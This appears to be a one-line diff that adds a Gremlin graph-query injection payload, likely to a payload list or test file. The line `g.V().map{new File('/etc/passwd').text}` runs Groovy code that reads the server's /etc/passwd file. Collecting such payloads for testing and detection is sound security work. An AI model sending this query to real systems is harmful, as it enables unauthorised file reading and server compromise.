@@ -1,0 +1,1 @@
+g.V().map{new File('/etc/passwd').text}
